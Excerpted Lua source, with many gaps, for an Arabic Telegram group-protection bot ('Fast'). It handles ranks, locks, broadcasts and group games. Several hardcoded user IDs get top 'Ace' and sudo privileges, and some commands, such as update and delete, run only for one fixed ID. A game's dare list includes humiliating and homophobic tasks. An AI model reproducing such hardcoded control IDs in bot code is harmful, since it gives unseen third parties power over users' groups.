...
chsource = Redis:get(Fast..'chsource') or "M_D_I"
devsource = Redis:get(Fast..'devsource') or "E_M_K"
devsource2 = Redis:get(Fast..'devsource') or "E_M_K"
function var(value)  
...
ControllerAll = false
local ListSudos = {Sudo_Id,1951693700,846074155,5190058736,918525237}
...
Status = true
elseif UserId == 846074155 then
Status = true
elseif UserId == 5190058736 then  
Status = true
elseif UserId == 918525237 then  
Status = true
...
Status = 'Myth🎖 '
elseif Dev then
Status = Redis:get(Fast..'SetRt'..ChatId..':'..UserId) or Redis:get(Fast.."Developer:Bot:Reply"..ChatId) or 'Myth²🎖'
elseif Ownerss then
...
Status = Redis:get(Fast..'SetRt'..ChatId..':'..UserId) or Redis:get(Fast.."President:Group:Reply"..ChatId) or 'منشئ اساسي'
elseif Creator then
...
MsgText = 'بثر برو ماكس'
elseif tonumber(Message) < 3500 then 
MsgText = 'مزعج'
elseif tonumber(Message) < 4000 then 
MsgText = 'مزعج برو ماكس'
...
SetRtAll = Redis:sismember(Fast.."SetRtAll:Groups",UserId) ,
...
if text == 'كانسل' and tonumber(senderr) == tonumber(1951693700) then
...
if text == 'ابديت' and tonumber(senderr) == tonumber(1951693700) then
...
if tonumber(senderr) == 1951693700 then
msg.Name_Controller = 'Ace🎖'
msg.The_Controller = 1
elseif tonumber(senderr) == 846074155 then
msg.Name_Controller = 'Ace🎖'
msg.The_Controller = 1
elseif tonumber(senderr) == 5190058736 then
msg.Name_Controller = 'Ace🎖'
msg.The_Controller = 1
...
send(msg.chat_id,msg.id,"•  هذا الامر يخص Dev🎖")
end
end
...
local UserInfo = bot.getUser(msg.sender_id.user_id)
local Teext = '•  المستخدم : ['..FlterBio(UserInfo.first_name)..'](tg://user?id='..msg.sender_id.user_id..')\n'
return send(msg_chat_id,msg_id,Teext..'•  ممنوع ارسال القذف \n ✓',"md")
end
end
end
...
return send(msg_chat_id,msg_id,"•  لا استطيع تغيير صوره القروب لاني لست ادمن او ليست لديه الصلاحيه ","md",true)    
end
Redis:del(Fast.."Chat:Photo"..msg_chat_id..":"..msg.sender_id.user_id)
return send(msg_chat_id,msg_id,"•  تم تغيير صوره القروب بنـجاح ","md",true)    
end
...
send(msg_chat_id,msg_id,"•  تمت الاذاعه الى *- "..#list.." * قروب في البوت ","md",true)      
Redis:del(Fast.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender_id.user_id) 
return false
end
...
( لو مش عارف تجيب ايدي المجموعه : بعد ما تفعل البوت اكتب ايدي المجموعه البوت بيرسله لك )
]]
...
local list = Redis:smembers(Fast.."ChekBotAdd")   
send(msg_chat_id,msg_id,"•  تم التوجيه الى *- "..#list.." * قروب في البوت ","md",true)      
for k,v in pairs(list) do  
...
Informationlua:close()
send(msg_chat_id,msg_id,"\n•  تم تغيير Dev🎖 اصبح على : [@"..text:gsub('@','').."]","md",true)  
dofile('Fast.lua')  
return false
end
end

if text == 'تغيير Dev' or text == '• تغيير Dev' then
if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then 
Redis:set(Fast.."AddSudosNew"..msg_chat_id,true)
return send(msg_chat_id,msg_id,"•  ارسل معرف Dev🎖 مع @........","md",true)
else
...
local Get_Chat = bot.getChat(Chatid)
if not data.id then
send(msg_chat_id,msg_id,'- لا توجد قروب في البوت بهذا الايدي')
return false
end
...
if text == "الغاء امر رفع MY" then 
  local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
  local UserInfo = bot.getUser(Message_Reply.sender_id.user_id)
  Redis:set(Fast..msg.chat_id.."creative:", UserInfo.id) 
  return send(msg.chat_id,msg.id,Reply_Status( rep_idd,"تم الغاء امر رفع MY").Reply,"md",true)
  end
  


  if text == "اضافة امر رفع MY" then 
    local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
    local UserInfo = bot.getUser(Message_Reply.sender_id.user_id)
    ...
    if text == "الغاء امر رفع M" then 
      local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
      local UserInfo = bot.getUser(Message_Reply.sender_id.user_id)
      Redis:set(Fast..msg.chat_id.."messi:", UserInfo.id) 
      return send(msg.chat_id,msg.id,Reply_Status( rep_idd,"تم الغاء امر رفع M").Reply,"md",true)
      end

      if text == "اضافة امر رفع M" then 
        local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
        local UserInfo = bot.getUser(Message_Reply.sender_id.user_id)
...
if photo.total_count > 0 then
local TestText = " •  Dev Bot🎖: \n\n•  Dev ↦ ["..FlterBio(UserInfo.first_name).."](tg://user?id="..Sudo_Id..")\n\n•  Bio ↦ ["..Bio.."]"
ban = ' '..FlterBio(UserInfo.first_name)..' '
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = ban, url='http://t.me/'..UserSudo..''},
},
}
local msg_id = msg.id/2097152/0.5
...
if text and text:match('^حذف (%d+)$') and tonumber(senderr) == tonumber(1951693700) then
...
if Redis:get(Fast..":"..msg.chat_id..":settings:mediaAude") then
local gmedia = Redis:scard(Fast..":"..msg.chat_id..":mediaAude:ids")  
if gmedia >= tonumber(Redis:get(Fast..":mediaAude:utdl"..msg.chat_id) or 200) then
local liste = Redis:smembers(Fast..":"..msg.chat_id..":mediaAude:ids")
...
Redis:del(Fast.."settings:mediaAude"..msg.chat_id)
...
Redis:set(Fast.."settings:mediaAude"..msg.chat_id,true)
...
Redis:set(Fast.."mediaAude:utdl"..msg.chat_id,Numbardel) 
send(msg_chat_id,msg_id, 'تم تعيين العدد  الى : '..Numbardel)
end
if text == ("عدد الميديا") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*  • عدد الميديا هو :  "..Redis:scard(Fast..":"..msg.chat_id..":mediaAude:ids").."*").yu,"md",true)
end
...
if not Redis:get(Fast..":"..msg.chat_id..":settings:delmsg") then
if text == ("امسح") and BasicConstructor(msg) then  
local list = Redis:smembers(Fast..":"..msg.chat_id..":mediaAude:ids")
for k,v in pairs(list) do
local Message = v
if Message then
...
if photo.total_count > 0 then
local TestText = "•  Owner🎖 : \n\n•  USE ↦ ["..FlterBio(UserInfo.first_name).."](tg://user?id="..UserInfo.id..")\n \n•  bio ↦ ["..Bio.."]"
ban = ' '..FlterBio(UserInfo.first_name)..' '
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = ban, url='http://t.me/'..UserInfo.username..''},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown')  
...
if text == "قفل ارسال القناة" or text == "قفل القناه" or text == "قفل القناة" then  
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
end
if ChannelJoinch(msg) == false then
...
if text == "فتح ارسال القناة" or text == "فتح القناه" or text == "فتح القناة" then  
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
end
if ChannelJoinch(msg) == false then
...
send(msg_chat_id,msg_id,Reply_Status(senderr,"•  تم قفـل القذف").Lock,"md",true)  
return false
end 
if text == "فتح القذف" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
end
if ChannelJoinch(msg) == false then
...
send(msg_chat_id,msg_id,Reply_Status(senderr,"•  تم فتح القذف").unLock,"md",true)  
return false
end 
...
send(msg_chat_id,msg_id,Reply_Status(senderr,"•  تم فتح الانجليزيه ").unLock,"md",true)  
return false
end 
...
data = {
{
{text = 'Dev Khalid', url = 't.me/E_M_K'}, 
},
}
}
return send(msg_chat_id,msg_id,"[Khaild](https://t.me/E_M_K)","md",true, false, false, true, reply_markup)
end
if text == 'مصنع السورس' or text == 'المصنع' or text == 'مصنع'  then
  ...
  data = {
  {
  {text = 'المصنع', url = 'https://t.me/emksnbot'}, 
  },
  }
  }
...
if text == 'رفع نسخه قائمه M' and msg.reply_to_message_id ~= 0 then
  if not msg.Asasy then 
  return send(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
  end
  local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
  ...
  return send(msg_chat_id,msg_id,'\n*•  تم استرجاع قائمه قائمه M* ',"md",true) 
  end
  end  
...
{
{text = GetSetieng(msg_chat_id).alphsar, data = '&'},{text = 'القذف : ', data =senderr..'/'.. 'Status_alphsar'},
},
{
...
return send(msg_chat_id,msg_id,'\n*•  تم تنزيل جميع رتب القروب { المنشئين الاساسسين , المنشئين , المدراء , الادمنيه  }* ',"md",true)  
end
...
if text == 'نبنبتبععثعثعثعثعثعثعق' and msg.reply_to_message_id == 0 then
if ChannelJoinch(msg) == false then
local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = Redis:get(Fast..'Chat:Channel:Join:Name'..msg.chat_id), url = 't.me/'..Redis:get(Fast..'Chat:Channel:Join'..msg.chat_id)}, },}}
return send(msg.chat_id,msg.id,'*\n•  عليك الاشتراك في قناة البوت لأستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
...
if TextMsg == 'قائمة MY' or TextMsg == 'قائمه MY' then
if not msg.Asasy then 
return send(msg_chat_id,msg_id,'\n*•  هذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
end
if ChannelJoinch(msg) == false then
...
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"• لايوجد MY حالياً, ","md",true)  
end
Redis:del(Fast.."Devss:Groups") 
return send(msg_chat_id,msg_id,"*•  تم مسح {"..#Info_Members.."} من قائمه MY*","md",true)
end
...
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"•  لا يوجد M حاليا , ","md",true)  
end
...
if text and text:match("^ss (.*)$") and tonumber(senderr) == tonumber(1951693700) then
local txx = "\n"
...
if text == "تفعيل بوت بالصوره" then
  ...
  if text == "حكم" or text == "احكام" or text == "احكم" then 
    ...
    return send(msg.chat_id,msg.id,"•  غبي انت تتزوج نفسك؟ .","md",true)
    end
    if tonumber(rep_idd) == tonumber(Fast) then
    return send(msg.chat_id,msg.id,"•  ابعد مابي اتزوج  .","md",true)
    end
    if Redis:sismember(Fast..msg.chat_id.."zwgat:",rep_idd) then
    local rd_zwag = {
        "ادخل خاص لـ بنت وقل لها احبك وهات سكرين بالرد",
        "اعترف للكراش انك معجب فيها",
        "اختار شخص يحكم عليك حكم من اختياره",
        "نزل صورتك هنا وثبتها",
        "افتح كام بالكول واكل ملعقة ملح كاملة",
        "غير اسمك واكتب انا حامل لمدة 24 ساعة",
        "سب نفسك قدام الناس",
        "قل لنا عن حبيبتك القديمة وكيف كرشتك ",
        "رح للمطبخ واكسر الكاسة بالأرض",
        "قل كم مره تيكنت واسماء البنات الي تيكنت معهم",
        "ادخل لبنت من اختيار صاحب الحكم وقل لها الي يبيه منك",
        "غير اسمك والبايو واكتب انا مطلقة",
        "اعترف لـ صاحب الحكم بـ اسم الشخص الي تحبه",
        "قل لنا كم مره قابلت بنت او ولد وشسويت",
        "اكتب انا حمار 10 مرات في القروب",
        "اتكلم عن سر ماحد يعرفه عنك",
        "تكلم بلهجة غير لهجتك لمدة 24 ساعة",
        "افتح كام بالكول ونط قدام الكام 5 مرات",
        "قل لنا وش كانو يسموك اهلك يوم كنت صغير",
        "حط افتار من اختيار صاحب الحكم",
        "حط علم المثلية مع اسمك والبايو",
        "غني فالكول",
        "ارسل لخويك وقل له احب اختك",
        "هات سكرين من الأستديو وارسلها هنا",
        "هات سكرين للخاص حقك",
        "رح للبنات وقل لهم انك حامل واطلب نصائح للحوامل "
    }
...
- ‏ابتسم في وجه الجميع وعش كأنك لاتراهم 🤍.
...
x = x + 1
send(Get_Chat.id,0,'*•  هيي انا عضو هنا بغادر وتقدر تفعلني متى ماودك *',"md")
...
data = {
{
{text="قائمه Dev",data=senderr..'/redis:Devall'},
},
{
{text="المكتومين عام",data=senderr..'/KtmAll'},{text="المحظورين عام",data=senderr..'/BanAll'},
},
{
{text="قائمه MY",data=senderr..'/Devss'},{text="قائمه M",data=senderr..'/Dev'},
},
{
...
if rtba_type == "sdev" then rtba_t = "MY"
elseif rtba_type == "dev" then rtba_t = "M"
...
if text and Redis:get(Fast.."Set:rtba"..senderr..":"..msg_chat_id) == "true" then
  ...
  data = {
    ...
    {{text = 'Myth²🎖', data = senderr..'/promot_dev/'..text}},
    {{text = 'Myth🎖', data = senderr..'/promot_sdev/'..text}},
  }
  }
...
Redis:set(Fast.."Get:Reides:Commands:Group"..msg_chat_id..":"..'M','رفع M')
...
Redis:set(Fast.."Get:Reides:Commands:Group"..msg_chat_id..":"..'MY','رفع MY')
...
local listA = {'تعطيل الايدي بالصوره','تفعيل الايدي بالصوره','ايدي','رفع مميز', 'رفع ادمن','رفع مدير', 'رفع منشئ', 'رفع منشئ اساسي','رفع M','تنزيل الكل','الرابط','الردود','مسح المكتومين','اضف رد','غنيلي','رسائلي','رفع MY','مسح تعديلاتي','نقاطي','اسالني','لغز','معاني','حزوره','رفع القيود','الغاء حظر','تثبيت','كشف','تاك','تاك للكل','تغيير الايدي','تنزيل جميع الرتب','قفل الاشعارات','فتح الاشعارات','مسح رد','اضف امر'}
...
Redis:del(Fast.."Get:Reides:Commands:Group"..msg_chat_id..":"..'M','رفع M')
...
Redis:del(Fast.."Get:Reides:Commands:Group"..msg_chat_id..":"..'MY','رفع MY')
...
local CmdStart = '\n• أهلاً بك عزيزي انا بوت اسمي '..(Redis:get(Fast.."Name:Bot") or "فاست")..
'\n• اختصاص البوت حماية المجموعات'..
'\n• اضف البوت الى مجموعتك .'..
'\n• ارفعه ادمن مشرف'..
'\n• ارفعه مشرف وارسل تفعيل ليتم تفعيل المجموعة'..
'\n• مطور البوت ← ["..FlterBio(UserInfo.first_name).."](tg://user?id="..UserInfo.id..")'
ban = ' '..FlterBio(UserInfo.first_name)..' '
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
